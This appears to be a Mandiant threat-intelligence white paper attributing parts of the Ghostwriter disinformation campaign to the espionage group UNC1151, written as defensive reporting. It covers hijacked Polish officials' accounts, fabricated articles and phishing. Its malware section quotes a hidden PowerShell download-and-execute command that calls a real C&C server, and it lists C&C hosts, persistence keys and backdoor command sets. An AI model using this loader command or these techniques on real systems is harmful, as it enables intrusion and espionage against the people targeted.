WHITE PAPER | CYBER ESPIONAGE GROUP UNC1151 LIKELY CONDUCTS GHOSTWRITER INFLUENCE ACTIVITY

Executive Summary
• In July 2020, Mandiant Threat Intelligence released a public
report1 detailing an ongoing cyber-enabled influence campaign
we named “Ghostwriter.” The campaign has primarily targeted
audiences in Lithuania, Latvia and Poland with narratives
critical of NATO’s presence in Eastern Europe. Since that
report, we have identified over twenty additional incidents
that we believe are part of Ghostwriter activity that we have
reported on to Mandiant Intelligence customers.
• The narratives, targeting, and tactics, technique and procedures
(TTPs) associated with Ghostwriter activity have expanded.
For example, five operations took place between October 2020
and January 2021 in which the social media accounts of Polish
officials were compromised and used to disseminate narratives
seemingly intended to discredit the Polish government and to
widen existing domestic political divisions.
• We now also assess with high confidence that UNC1151,
a suspected state-sponsored cyber espionage actor that
engages in credential harvesting and malware campaigns,
conducts at least some components of Ghostwriter activity.
Beginning at the start of 2021, UNC1151 expanded its credential
theft activity to target German individuals, with a focus on
politicians. We do not associate UNC1151 with any other
previously tracked threat groups.

Introduction
In July 2020, Mandiant Threat Intelligence released a
public report2 detailing an ongoing influence campaign
we named “Ghostwriter.” Ghostwriter is a cyber-enabled
influence campaign which primarily targets audiences
in Lithuania, Latvia and Poland and promotes narratives
critical of the North Atlantic Treaty Organization’s (NATO)
presence in Eastern Europe. Since releasing our public
report, we have continued to investigate and report on
Ghostwriter activity to Mandiant Intelligence customers.
We tracked new incidents as they happened and identified
activity extending back years before we formally identified
the campaign in 2020. This report provides an update on
Ghostwriter, highlighting two significant developments.
We have observed an expansion of narratives, targeting
and TTPs associated with Ghostwriter activity since we
released our July 2020 report. For example, several recent
operations have heavily leveraged the compromised social
media accounts of Polish officials on the political right to
publish content seemingly intended to create domestic
political disruption in Poland rather than foment distrust of
NATO. These operations, conducted in Polish and English,
appear to have largely not relied on the dissemination
vectors we have typically observed with previous
Ghostwriter activity, such as website compromises,
spoofed emails or posts from inauthentic personas.

Recently obtained technical evidence now allows us to
assess with high confidence that UNC1151, a suspected
state-sponsored cyber espionage actor that engages in
credential harvesting and malware campaigns, conducts
at least some components of Ghostwriter influence
activity; current intelligence gaps, including gaps
pertaining to website compromises and the operation of
false personas, do not allow us to conclusively attribute
all aspects of the Ghostwriter campaign to UNC1151 at
this time. We do not associate UNC1151 with any other
previously tracked threat groups. Since the start of
2021, UNC1151 has expanded its credential theft activity
to target German politicians. This targeting has been
publicly reported in the German Tagesschau.3
The appendices of this report include an exhaustive
table of incidents and operations we currently associate
with Ghostwriter activity, a detailed case study of a
recent operation and indicators of compromise (IOCs)
related to UNC1151.

Observed Expansion of Narratives,
Targeting and TTPs associated with
Ghostwriter Activity
While we have continued to track and investigate
Ghostwriter influence activity that follows the typical
operational model laid out in our July 2020 public report,
we have also observed an expansion of the narratives,
targeting and TTPs associated with Ghostwriter activity. For
example, in January, we began investigating five operations
that took place between October 2020 and January 2021
in which the social media accounts of Polish officials were
compromised and used to disseminate narratives seemingly
intended to discredit the Polish government domestically
and to widen existing domestic political divisions.
• The five operations used compromised Twitter, Facebook

and/or Instagram accounts of Polish officials as the main
vector for content dissemination. We have observed
no evidence that these platforms were themselves
in any way compromised, and instead believe social
media account credentials were obtained using the
compromised email accounts of targeted individuals.
The takeover of high-profile social media accounts
after the operators have gained access to those users’
corresponding email accounts reinforces the continued
importance for potential campaign targets to secure their
social media accounts with two-factor authentication.
• Polish officials who are members of political parties

within the ruling United Right political coalition
(Zjednoczona Prawica), which currently holds power
in Poland, were the primary victims of the observed
account compromises. The majority of United Right
coalition victims are either affiliated with the Law and
Justice party (Prawo i Sprawiedliwoś or PiS) or the
Agreement party (Porozumienie).

Activity Targeted Polish Domestic Politics
Overall, narratives promoted in the five operations
appear to represent a concerted effort to discredit the
ruling political coalition, widen existing domestic political
divisions and project an image of coalition disunity in
Poland (Table 1). In each incident, content was primarily
disseminated via Twitter, Facebook, and/or Instagram
accounts belonging to Polish politicians, all of whom have
publicly claimed their accounts were compromised at the
times the posts were made. The incidents also touched on
some consistent themes: two involved the dissemination of
compromising photos of officials and people with whom
they are associated, two falsely implicated the respective
officials as criticizing female activists and one falsely
claimed that an official wanted to renounce her affiliation
with the PiS party. In some cases, we have relied on
media reporting to reconstruct particular details of some
operations’ content as the relevant posts were no longer
available at the time of investigation. In others, we were
able to independently confirm the content of posts.

Incident Description

Oct. 29, 2020

Joanna Borowiak,
PiS party (Twitter)

A tweet published to the Twitter account of Polish MP Joanna Borowiak called pro-choice activists
“drug addicts-prostitutes and child killers” (Figure 1).4

Nov. 19, 2020

Marcin Kamil Duszek,
PiS party (Facebook)

A post published to the personal Facebook account of Polish MP Marcin Kamil Duszek featured private,
compromising pictures of a woman, some of which also included Duszek himself. The post introduced the
woman as Duszek’s new secretary and stated that his “fellow Members [of parliament] will be jealous”.5

Dec. 15, 2020

Marlena Maląg,
PiS party (Facebook)

A post published to the Facebook account of Poland’s Minister for Family and Social Policy, Marlena
Maląg, condemned female activists involved in protests against then-forthcoming new abortion laws.
The post used racial slurs to characterize the women and compared them to “brainless savages”.6

Jan. 12, 2021

Iwona Michałek,
Porozumienie party (Twitter)

A tweet published to the Twitter account of Iwona Michałek, Poland’s deputy minister of development,
labor, and technology, disseminated the false narrative that she no longer wanted to be affiliated with
the PiS party. The tweet condemned PiS as the party of “murderers, thieves, and executioners” and
featured a cartoon of PiS leader Jarosław Kaczyński in prison (Figure 1).7

Jan. 18, 2021

Marek Suski,

Compromising photos of a woman closely resembling Ewa Szarzyńska, a local politician from Mogilno,
were disseminated by multiple accounts, including compromised Twitter and Instagram accounts
belonging to Szarzyńska and the Twitter account of Polish MP Marek Suski.
Additional posts to an Instagram account using Szarzyńska’s name included compromising photos
appearing to feature Dobromir Szymański, an Inowrocław councilman and assistant to a deputy
minister. We were unable to determine whether this account was Szarzyńska’s compromised account
or a separate Instagram account impersonating her.8

WHITE PAPER | CYBER ESPIONAGE GROUP UNC1151 LIKELY CONDUCTS GHOSTWRITER INFLUENCE ACTIVITY

In a second phase of dissemination following the January
18, 2021 incident involving the compromised social
media accounts of Marek Suski and Ewa Szarzyńska,
additional TTPs typically observed in historical Ghostwriter
operations were also used: On January 20, 2021, two
days after the operation’s Polish-language content was
disseminated, a potentially fabricated English-language
article was published and disseminated on multiple
websites by single-use accounts that appear to be
impersonating the real Polish journalist and radio host
Jan Wróbel. The specific websites used to publish and
disseminate this content have been used in previous
Ghostwriter operations.
October 2020 NATO-Themed Operation also Leveraged
Compromises of Polish Officials’ Social Media Accounts
Another suspected Ghostwriter operation promoted
a narrative between October 22-26, 2020, suggesting
that NATO is preparing its military for a war with Russia,
which would ostensibly take place in Poland, Latvia and
Lithuania, a narrative consistent with those promoted
in past Ghostwriter operations that appear intended to
undermine NATO’s presence in—and security cooperation
with— those three specific countries. In addition to
spreading this narrative via a fabricated article published
to multiple websites, including sites used in previous
Ghostwriter operations, links to that article were also
disseminated via posts by multiple compromised social
media accounts belonging to Polish officials. We observed
overlaps between this operation and some of the Polish
social media compromises referenced above.
• The operation used at least three compromised social

media accounts of Polish officials to disseminate links
to the fabricated article published on three websites.
The accounts belong to two current members and one

former member of the Polish parliament from the PiS
party: Joanna Borowiak (Twitter), Marcin Kamil Duszek
(Facebook) and Andrzej Melak (Facebook).
– Both Borowiak’s Twitter account and Duszek’s

Facebook account were each also used in one of the
domestically focused operations detailed previously.
We were unable to independently review an archived
copy of Borowiak’s tweet, but reviewed images of it
published by multiple media outlets.9
– Borowiak’s Twitter account published the tweet

promoting the NATO narrative on October 26, 2020,
three days prior to publishing the post critical of
Polish female protesters. Borowiak claims her account
was compromised and she did not have access to her
Twitter during this entire period.10, 11
• The fabricated article concerned a NATO defense

minister’s meeting that took place on October 22,
2020, and appears to have appropriated text from a
real news article reporting on that meeting.12 However,
the fabricated article was published under a different
title and contained additional text. Both the new title
and inserted text supported the narrative that Poland
is at the epicenter of the coming war between NATO
and Russia. The article was published to at least two
Polish-language news sites, Prawy.pl and Obserwator
Nadodrzański (ono24.info), and to the county
administration website (wschowa.info) for Wschowie,
which is in Poland’s Lubusz province (Figure 2). We were
not able to independently determine whether these
websites were compromised in this instance (a common
tactic seen in previous Ghostwriter operations), but we
note that Prawy.pl has been compromised as part of
previous Ghostwriter operations and both Prawy.pl and
wschowa.info have since removed the article.

UNC1151 Conducts Components of
Ghostwriter Influence Activity
We assess with high confidence that UNC1151, a suspected
state-sponsored cyber espionage group, conducts at
least some components of Ghostwriter influence activity;
current intelligence gaps, including gaps pertaining to
website compromises and the operation of false personas,
do not allow us to conclusively attribute all aspects of the
Ghostwriter campaign to UNC1151 at this time. UNC1151
intrusion activity has been active since at least 2017 and
has included credential harvesting campaigns targeting
European government and media entities as well as some
instances of using spear phishing to distribute malware. We
do not associate UNC1151 with any other previously tracked
threat groups and do not make any further attribution
assessment at this time. Appendix 3: Technical Annex
presents additional detail and MITRE ATT&CK techniques
(T1547.001, T1218.005, T1059.005, and T1071).

– UNC1151 often uses long subdomains to make phishing

UNC1151 Overview
UNC1151 has conducted numerous campaigns designed to
steal credentials and deliver malware via spear phishing.
The group uses an extensive array of domains that mimic
major and regional web services and host pages designed
to trick a victim into entering their credentials. Less
frequently, the group has distributed malware via phishing
emails with malicious attachments, including RADIOSTAR,
VIDEOKILLER and HALFSHELL malware.

– The targeting of German individuals has been

• Credential Harvesting Operations:13 UNC1151 was first

uncovered conducting credential harvesting operations
targeting government, military and media entities in
Poland, Ukraine and the Baltics. UNC1151 has also targeted
personal email accounts of individuals of interest to
them, such as journalists and activists. Since the start of
2021, this credential theft activity has expanded to target
German individuals, with a focus on politicians.
– UNC1151 credential harvesting domains often have

domains look legitimate.
– UNC1151 has targeted thousands of personal and

corporate accounts with differing degrees of tailored
content since 2017.
 For example, on March 4, 2020 Mandiant Threat

Intelligence discovered a spear-phishing email
using a spoofed “ukr.net” address targeting a
Ukrainian journalist. The email had been sent via
the SMTP2GO service and the Gophish framework.
It contained a malicious link that led to a spoofed
login page designed to steal credentials.
 We also identified a high-profile Belarussian

blogger and activist targeted by UNC1151 credential
harvesting operations.
reported in the German media, including articles in
Der Spiegel14 and Tagesschau.15 We believe that this
reporting is referring to credential theft activities
conducted by UNC1151. We have not seen follow-on
operations using any potentially stolen credentials.
• Campaigns Using Malware:16 UNC1151 has also

distributed malware via spear phishing. The malware
used has all been unique to this group. The malware is
delivered using straightforward phishing operations,
likely for espionage. The phishing emails from these
operations most often have generic themes lacking
connections to contemporary events or disinformation,
though in some cases, lures have been related to
inflammatory current events. For example, actors
in one operation used a lure related to COVID-19
misinformation in Ukraine to deliver HALFSHELL
malware. Other campaigns using malware relied on less
inflammatory lures such as bank safety notifications.

organizations they seek to phish or popular (and
sometimes regional) web services.

UNC1151 Links to Ghostwriter Activity
Multiple artifacts, emails and documents in our UNC1151
data indicate the group conducts at least some
components of Ghostwriter activity. For example:
• UNC1151 has sent multiple emails that support or

reference Ghostwriter operations. These emails do
not contain malware or attempt to steal credentials,
but instead distribute operational narratives. In one
operation, UNC1151 sent emails in April 2020 with links
to a fabricated article posted on a compromised Polish
military website (See Table 2: Polish Soldiers Should
Rebel Against American “Occupational Forces”) to
further disseminate that operation’s narrative. On the
same day, UNC1151 sent additional emails to additional
entities referencing the Polish government’s poor cyber
security and susceptibility to disinformation.
• We discovered two blended Ghostwriter and cyber

espionage operations against Lithuanian media
entities in 201817 and 201918 which have been reported
on by the Lithuanian CERT. We were able to connect
the infrastructure used in these operations to UNC1151
credential harvesting operations that were active at
the time.19

• The content, narratives and chronology of at least 13

emails sent to various U.S. and European-based media
outlets by UNC1151 using the Gophish framework align
with previously identified Ghostwriter operations. We
detailed seven of these operations in our public report
on Ghostwriter released in July 2020.
• Our UNC1151 data contains a copy of a forged letter

purportedly sent from NATO Secretary General Jens
Stoltenberg to Lithuanian Minister of National Defense
Raimundas Karoblis announcing the withdrawal of NATO
forces from Lithuania due to COVID-19 concerns, which
we previously determined was used as part of an April
2020 Ghostwriter operation.
• Technical indicators suggest that the email accounts

of the Polish officials whose social media accounts
were used in the domestically focused operations
detailed previously were likely compromised by
UNC1151 during the same timeframe that their
compromised social media accounts were used to
support Ghostwriter activity.

Conclusion
Mandiant Threat Intelligence has continuously investigated and reported on the
ongoing Ghostwriter influence campaign since publicly naming it in July 2020.
We have since observed a seeming expansion of the narratives, targeting and
TTPs associated with Ghostwriter activity and developed further intelligence
that leads us to assess that the cyber espionage group UNC1151 conducts at least
some components of Ghostwriter activity. We have also identified Ghostwriter
influence activity extending back years before we formally identified the campaign
in 2020. However, current intelligence gaps, including gaps pertaining to website
compromises and the operation of false personas, do not allow us to conclusively
attribute all aspects of the Ghostwriter campaign to UNC1151 at this time.

Case Study of Recent Ghostwriter
Operation Alleging Involvement
of U.S. Military and Polish and
Lithuanian Officials in Fictitious
Polish Military Prostitution Scandal

WHITE PAPER | CYBER ESPIONAGE GROUP UNC1151 LIKELY CONDUCTS GHOSTWRITER INFLUENCE ACTIVITY

In February 2021 we identified and reported to Mandiant
Intelligence customers a February 25–26 suspected
Ghostwriter operation targeting Polish and Lithuanian
audiences that promoted a narrative alleging the
involvement of U.S., Polish and Lithuanian officials in a
prostitution scandal within the Polish military. The narrative,
which appeared intended to create tensions between
Poland and Lithuania and undercut local support for the
implicated individuals and government institutions, was
disseminated via a fabricated article and fabricated official
statements promoted using multiple compromised websites
and at least two suspected compromised social media
accounts. We believe the narrative was also potentially
disseminated via emails using a spoofed elected official’s
email address. We assess with moderate confidence
that this operation comprises part of the Ghostwriter
influence campaign based on observed consistencies in
the promoted narrative, employed tactics, techniques and
procedures (TTPs) and targeting.

16

Narrative Summary and Dissemination
The operation promoted a narrative alleging that the
Polish Ministry of National Defense uses female officers
to provide “escort services” for important Polish and
foreign officials. A named female officer was alleged to
have provided such services for Polish President Andrzej
Duda, Lithuanian Foreign Minister Gabrielius Landsbergis
and senior U.S. military representatives. We identified
multiple vectors by which we believe this narrative was
disseminated. We were unable to confirm the exact
timeline of dissemination. However, details included
in different pieces of promoted content, including
screenshots of or references to previous social media
posts and other material, enabled us to reconstruct a
general timeline of activity (Figure 3). In all but one
instance of suspected compromise, we observed public
statements issued by the victims and/or government
officials or organizations claiming the respective websites
or social media accounts had been compromised.

• On February 26, 2021, the Lithuanian Ministry of Foreign

Affairs published an official statement confirming an
“information attack on Lithuanian-Polish relations” and
referencing individuals implicated in the operation.21
Polish officials and ministries have likewise published
and/or promoted related posts on social media
confirming the compromise of officials.22, 23
• The operation used various dissemination vectors to

promote a set of fabricated statements from officials
and a fabricated news article to establish narrative
details. This dissemination strategy may have been
designed to imitate a pattern of official statements
and media responses that would unfold around the
revelation of an actual government scandal to impart
a greater sense of legitimacy to the narrative and
potentially increase its reach.

February 25, 2021

The operation’s
dissemination
phase used
potentially
spoofed emails as
well as multiple
social media
accounts and
websites that
we suspect were
compromised
to promote
fabricated official
statements and a
fabricated article.

Włodzimierz Bernacki
(Twitter)

Multiple tweets posted to the account of Włodzimierz Bernacki,
Poland’s Secretary of State in the Ministry of Education and
Science of the PiS party, alleged that Bernacki had identified
a female Polish military officer who provided escort services
for officials. The tweets included screenshots of, and a link to,
a profile page allegedly belonging to the implicated female
officer on a website for “casual” intimate meetups, featuring
pictures of a woman in uniform with officials, as well as images
of a similar-looking woman engaged in sexual activities.*

The official website of Elżbieta Witek, Marshal of Poland’s
Sejm (Poland’s lower house of parliament) from the PiS party,
was reportedly compromised and used to publish a fabricated
“official” response to the tweets by Bernacki’s Twitter account.
The post included a screenshot of one of those tweets.**
Elżbieta Witek
(elzbietawitek.pl)

Tygodnik Solidarność
(Tysol.pl)

A fabricated article posted on February 25 to the website of
Tygodnik Solidarność, a Polish weekly magazine, reported
on the “news” of the Polish military prostitution scandal. The
article referenced the fabricated statements published to
Bernacki’s Twitter account and Witek’s website, and provided
new supposed details about the officials allegedly implicated
in the scandal. Tysol.pl published a follow-up article confirming
that their website had been compromised and leveraged to
publish the fabrication.***

Jakub Marciniak
(Twitter)

The Twitter account of Jakub Marciniak, whose bio lists affiliation
with Porozumienie’s youth organization Young Right (Polish:
Młoda Prawica), was used to further disseminate the narrative.
At least 35 tweets directed at various Polish media outlets,
officials and government institutions, and other notable
individuals, included links to the then-compromised website
of Elżbieta Witek. Some also included a link to the file upload
website AnonFiles that allowed for the download of the same
compromising photos linked to in the tweets by Włodzimierz
Bernacki’s account.****

February 25-26, 2021
(timing uncertain)

Aušrinė Norkienė

Reports suggest that emails spoofing the email address
of Lithuanian MP Aušrinė Norkienė further disseminated
the narrative, which implicated Lithuania’s foreign minister, in
Lithuanian. On February 26, the Seimas, Lithuania’s parliament,
published a statement about an information attack against
Lithuania and Poland, indicating that it included emails sent
“illegally indicating” the email address of Aušrinė Norkienė.*****

*

The tweets from Bernacki’s account were removed before we could review them. We relied on screenshots and details provided by other
Twitter users and corroborated by Polish national-level media reporting for this information. The Polish Ministry of Education and Science
posted a tweet indicating that Bernacki’s account had been compromised. (https://www.tvp.info/52492224/wlamanie-na-konto-senatora-natwitterze-wlodzimierz-bernacki-tlumaczy; https://twitter.com/MEIN_GOV_PL/status/1364895680284815362)

**

We did not observe a statement from Witek claiming her website had been compromised. However, Stanisław Żaryn, Spokesperson
for Poland’s Minister-Special Services Coordinator, stated on social media that content was placed on Witek’s site as part of the operation.
(https://twitter.com/StZaryn/status/1365339372774645761)

We did not observe claims by Marciniak that the account was compromised. The relevant tweets have since been deleted.

Narrative, TTPs and Targeting Consistent with Ghostwriter Campaign
We believe that this operation comprises part of the ongoing Ghostwriter influence campaign based on observed
consistencies in narrative, TTPs and targeting. The operation blended tactics traditionally associated with Ghostwriter
operations with the expanded campaign tactics discussed previously.
• The operation’s narrative, which focused on portraying

the Polish military and Polish, Lithuanian and U.S.
officials negatively, is consistent with those observed in
past Ghostwriter operations, which are likely intended
to create tension in regional security partnerships
by promoting false narratives surrounding accidents
or scandals as detrimental to local populations. This
operation appears to be an attempt to discredit the
Polish military as an institution and undermine PolishLithuanian relations.
• Multiple suspected compromised social media accounts

belonging to individuals affiliated with political parties
in Poland’s ruling United Right coalition were used
for narrative dissemination. As noted earlier, recent
Ghostwriter operations have used compromised social
media accounts belonging to Polish officials to both
seed and disseminate narratives. The targeting of
individuals affiliated with parties of the United Right
coalition in this operation is consistent with the profiles
of other individuals whose social media accounts were
previously compromised and used.
• Compromising photos were disseminated as “evidence”

to support the operation’s narrative, similar to the
multiple recent Ghostwriter operations targeting
Polish domestic political issues. In this operation,
compromising photos were initially included in
tweets published to a Polish official’s compromised
account, and then again in tweets issued from a
second suspected compromised account via a link to

the file download website AnonFiles. This pattern of
disseminating compromising photos to seed narratives
and then amplifying them further via an AnonFiles
download link is consistent with the January 18, 2021,
“Polish Politician Posts Compromising Sexual Photos of
Former PiS Mayoral Candidate” operation.
• We suspect the operation used two compromised

websites to promote fabricated content. The website
of Tygodnik Solidarność, to which the fabricated article
was published, subsequently claimed the fabrication
had been published following a website compromise.24
Stanisław Żaryn, spokesperson for Poland’s MinisterSpecial Services Coordinator, stated on social media
that content was “placed” on Elżbieta Witek’s site as
part of the operation.25 Past Ghostwriter operations
have frequently involved the compromise of news and
government websites to publish fabricated content.
• Emails spoofing the official email address of Lithuanian

MP Aušrinė Norkienė potentially further disseminated
the narrative in Lithuanian. Lithuania’s parliament, the
Seimas, issued a statement on February 26, which
indicated that emails were sent “illegally indicating” the
email address of Norkienė as part of an “information
attack” against Lithuania and Poland.26 Multiple
previously observed Ghostwriter operations have used
spoofed official email addresses to directly disseminate
narratives and supporting fabricated material. We
documented this as a frequently used campaign
tactic,27 and we have continued to see it used in other
Ghostwriter operations since.

Credential Harvesting
Mandiant Threat Intelligence has tracked and reported
on UNC1151 credential harvesting operations for Mandiant
clients since 2018. UNC1151 often sends credential harvesting
links to victims in phishing emails. The credential harvesting
domains often spoof legitimate services and sometimes
have long subdomains to make their spoofed domains look
more legitimate. A notable recently reported on UNC1151
credential harvesting campaign targeted various members
of German national and local parliaments.

WHITE PAPER | CYBER ESPIONAGE GROUP UNC1151 LIKELY CONDUCTS GHOSTWRITER INFLUENCE ACTIVITY

UNC1151 Operations Delivering Malware
In 2018 and 2019 the Lithuanian CERT reported on
multiple Ghostwriter operations, the IOCs included in
that report are tracked by Mandiant as being used in
ongoing threat activity from UNC1151.28, 29 Drawing from
their reports, Mandiant Threat Intelligence has identified
UNC1151 involvment in several malware campaigns,
including RADIOSTAR, VIDEOKILLER, and HALFSHELL.
The capabilities and level of sophistication of the
malware remain similar across the families. RADIOSTAR
malware may have been used in a Ghostwriter campaign
in 2018 targeting Lithuania; this case appeared to be
an exception, as we do not often observe Ghostwriter
influence operations use malware. This case also led us to
discover additional UNC1151 activity using VIDEOKILLER.
UNC1151 has also used HALFSHELL malware to target
a Ukrainian entity in 2020 with a potential COVID-19
disinformation nexus.
We have observed UNC1151 using malicious documents to
deliver malware to victims in phishing operations. Much
of the data we have for UNC1151 is historical and thus, in
many cases, we were unable to obtain payloads beyond
initial malicious documents sent via phishing email. In the
few instances where we have observed UNC1151 malware,
it has been rudimentary.
Targets of these operations span the following regions:
• Poland
• Lithuania
• Estonia
• Ukraine
• Ireland
• Colombia
• Switzerland
• Germany

Many emails were sent to personal email addresses
whose owners which we were unable to identify. However,
targets we have identified include:

UNC1151 Espionage and Ghostwriter Influence
Operations in Lithuania
Mandiant Threat Intelligence was able to connect
infrastructure used in two Ghostwriter operations
targeting Lithuanian media entities in 2018 and 2019 to
then-ongoing UNC1151 credential harvesting operations.
These operations allowed us to uncover additional
UNC1151 malware campaigns.
2018 Campaign: “Lithuanian Minister of National Defense
Committed Sexual Assault”
In January 2018, a suspected English- and Lithuanianlanguage Ghostwriter operation promoted the narrative
that multiple government officials and a journalist had
come forward with allegations of sexual assault against
Lithuanian Defense Minister Raimundas Karoblis, and
also falsely claimed that Karoblis was homosexual.
The narrative was first published in an article on the
compromised Tv3.lt website in Lithuanian. A link to the
article hosted on the compromised site was also directly
emailed to a targeted mailing list including government
ministries and embassies. Shortly thereafter, an English
version of the narrative was disseminated by a known
Ghostwriter persona, Rudis Kronitis, on multiple sites as
well as on two suspected Ghostwriter-controlled blogs in
English and Lithuanian, respectively.30
The document was delivered via phishing email to
Lithuanian media and government entities.31 Although
we were not able to recover a copy of the email, the
indicators in the Lithuanian CERT report enabled us to
identify that the email was sent using a legitimate email
delivery service called SMTP2GO, which can be used
to mask the sender’s real IP address. According to the
report, the attacker attempted to spoof the sender to
masquerade as tv3.lt but made a typo such that the
sender was “noreplay@tv3.lt” instead of “noreply@tv3.lt.”
The lure document attached to the email purported
to be a legitimate press release. It included a link to a
fabricated article posted on the Tv3.lt website and an
appended legitimate copy-and-pasted article on the
defense minister.

2019 Campaign: Lithuanian Minister of Defense
Raimundas Karoblis Suspected of Corruption
In April 2019, an information operation involving direct
email dissemination, the compromise of multiple news sites
and dissemination by inauthentic accounts posing as the
editor of a Lithuanian media outlet promoted a narrative
falsely accusing Lithuanian Minister of Defense Raimundas
Karoblis of corruption. The dissemination email’s header
information indicates that the email originated from
the IP address 94.103.82.136. In January 2019, we had
observed that this IP was used by UNC1151 to register
multiple domains with names similar to European, Middle
Eastern and political activism and journalism entities. After
additional investigation, we were able to determine that
IP address was a dedicated actor-controlled server for
UNC1151 and thus saw a direct connection between this
Ghostwriter operation and UNC1151.

25

Other UNC1151 Campaigns
After referencing activity outlined in the Lithuanian CERT
reports related to Ghostwriter operations in 2018 and 2019,
Mandiant Threat Intelligence was able to identify additional
UNC1151 espionage activity. This included malware
campaigns masquerading as a Polskie Radio newsletter,
a “gift” campaign with an unknown purpose, a COVID-19
themed campaign and a campaign masquerading as the
Ukrainian polling agency SOCIS.
Polskie Radio Campaign using RADIOSTAR
In one case, we discovered an UNC1151 lure document
masquerading as a Polskie Radio newsletter that
contained copy-and-pasted inflammatory political news
articles from a Polish news outlet as a part of a phishing
campaign. According to the Polskie Radio outlet,33 the
emails were sent from Russian email addresses and
contained links which, upon user execution, would
download the malicious document.
The lure document was hosted at the following location:

This malicious document contains the same DDE
command and C&C server as the previously analyzed
sample from the Lithuanian RADIOSTAR campaign.
It also contains the same error message in Russian.
The executionflow also follows the same pattern as
the sample from the Tv3.lt compromise, downloading
RADIOSTAR as the final payload.
RADIOSTAR is a PowerShell backdoor that XOR-decodes
and runs different PowerShell commands received from
the C&C server.

The script first starts a new web client with the same
unique user agent string, calling out to the C&C server
every 60 seconds. All communications with C&C server
are XOR encoded with the key “65.” It checks for the
following strings in C&C responses:
• get-content
– Runs string as a command
• set-content
– Downloads and XOR-decodes responses from the

C&C server
– Executes decoded response as a command
• if neither of the above:
– Executes string as a command
– Converts object data response into string
• exit
– break execution

The script responds to the C&C server with either
“executed” or “not executed” XOR-encoded with key “65.”

Unknown “Gift” Campaign using VIDEOKILLER
This campaign used a very different operational flow,
but later stages contain the same functionality and use
the same unique user agent and C&C server identified
in previous samples. The lure document in this case is
an image of a gift; it prompts the user to click “OK” to
receive their gift.

If the user double clicks the gift image, they are
prompted to download an LNK file.

It then calls out to the C&C server using the following
methods from the WebClient class:

• giftForYou.lnk (MD5:

• DownloadData

0faf36548b8396851368c532ad4ac348)
– LNK file dropped by the gift document
– C&C: http://88.99.104.179:1985/win_update/upgrade
– Information parsed from LNK:
 Creation time: 2017-10-31 17:04:18
 MAC address: 00-0C-29-B9-B8-D0
 MAC manufacturer: VMware, Inc.
 Machine ID: music

The LNK file attempts to run the following PowerShell
command:
C:\Windows\System32\WindowsPowerShell\v1.0\
powershell.exe” -NoP -sta -NonI -W Hidden IEX
((New-Object
System.Net.WebClient).
DownloadString(‘http://88.99.104.179:1985/win_
update/upgrade’))

A string representing a secondary PowerShell command
is downloaded from C&C server. We were unable to
recover this string during our investigation. However,
we believe that after running this secondary PowerShell
command, the attacker attempts to download an
obfuscated .NET dropper, the VIDEOKILLER dropper,
from the C&C server. After dropping and launching the
backdoor, the VIDEOKILLER dropper kills the process.
VIDEOKILLER is a .NET backdoor similar to RADIOSTAR
that handles commands from the C&C server. It
masquerades as conhost.exe. The majority of strings it
contains are Base64 encoded, though some are not, such
as the string “It’s Ok” which is potentially used for logging
throughout execution.
The malware maintains its persistence on the victim’s
system using the following registry keys:
Key: HKLM\Software\Microsoft\Windows\
CurrentVersion\Run\
Value: %TEMP%\conhost.exe

28

• UploadString
• DownloadString
• UploadData
• DownloadFile

VIDEOKILLER checks for several possible strings C&C
server response:
• cd
– Traverse directories based on string input, return

current directory after traversal
• set-content
– Write data to file
– There is no error message sent to the C&C for this

command
• get-content
– Gets content of a data stream at specified location

using PowerShell and parses it
– If an exception is thrown, sends “<Prog Error>” to the

C&C
• start
– Executes the string as a command using PowerShell
– If an exception is thrown, sends “Exec error” to the C&C
• dir -Force
– Executes the string as a command using PowerShell
– If an exception is thrown, sends “Exec error” to the C&C

If none of the above strings appear in the response, then
the malware attempts to run the received string using
PowerShell, returning the result of execution as a string.
If an exception is thrown, the malware sends “<Not
Resolved>” to the C&C server.
As with RADIOSTAR, all communications between
VIDEOKILLER and the C&C server are XOR-encoded with
the key “65.”

HALFSHELL Targeting Ukraine
A phishing email with a malicious attachment was sent to
a Ukrainian victim purporting to be from the Ministry of
Health of Ukraine on February 20, 2020 with the subject
“Короновірус в Україні підтверджено” (Coronovirus
in Ukraine confirmed). The malicious attachment
drops the HALFSHELL malware, a .NET backdoor that
can enumerate basic system information and retrieve
commands to be run by cmd.exe, to the victim machine.
The phishing email was sent using SMTP2GO, an outgoing
email client, and the malicious attachment was created
using the open-source framework GoPhish.
The text in the body of the email prompts the victim to
click on the attachment for more information about the
coronavirus and to share that information with family
and colleagues.

After the malware ran successfully, it dropped the
following files to the victim’s system:
• \Users\Administrator\conhost.exe

(MD5: 0acecad57c4015e14d9b3bb02b433d3e)
– HALFSHELL malware
– .NET backdoor
– Surveys basic system information and running

processes, receives commands from C&C
– C&C: cloud-security.ggpht.ml

The malware attempted to beacon to the CnC server with
the following survey information about the victim device in
the beacon header as an identifier for the victim machine:
• Username
• Machine name
• MD5 of run location
• Network interface

The expected beacon structure was:
<user name>;<computer name>;<Network Interface
Physical Address>;<7 bytes of MD5 of path>
The HALFSHELL malware then sent a GET request to the
CnC server, expecting a Base64 encoded command in the
response. The expected response structure was:
{<taskID>:”command”:<base64 encoded command>}
If the decoded command did not begin with the character
‘#’, HALFSHELL ran the command received from the
CnC server using the command line. If the command was
‘#klg start’, HALFSHELL ran a keylogging module. The
command ‘#klg stop’ conversely caused HALFSHELL to
stop the malware from keylogging.

SOCIS Campaign
Mandiant Threat Intelligence also identified UNC1151
attempts at phishing where we were unable to retrieve
the latter stages of the operation due to the historical
nature of the data we obtained. In this example of a
possible disinformation-nexus campaign using malware in
early 2019, we were unable to determine if UNC1151 used
RADIOSTAR, VIDEOKILLER or HALFSHELL malware.
UNC1151 delivered a malicious document to a Ukrainian
entity through a phishing email spoofing the Ukrainian
polling agency SOCIS from the IP address 94.103.82.136.
We previously observed this IP in UNC1151 credential
harvesting operations and a Ghostwriter disinformation
dissemination operation. We believe this was one of the
actor-controlled servers UNC1151 used for its operations.
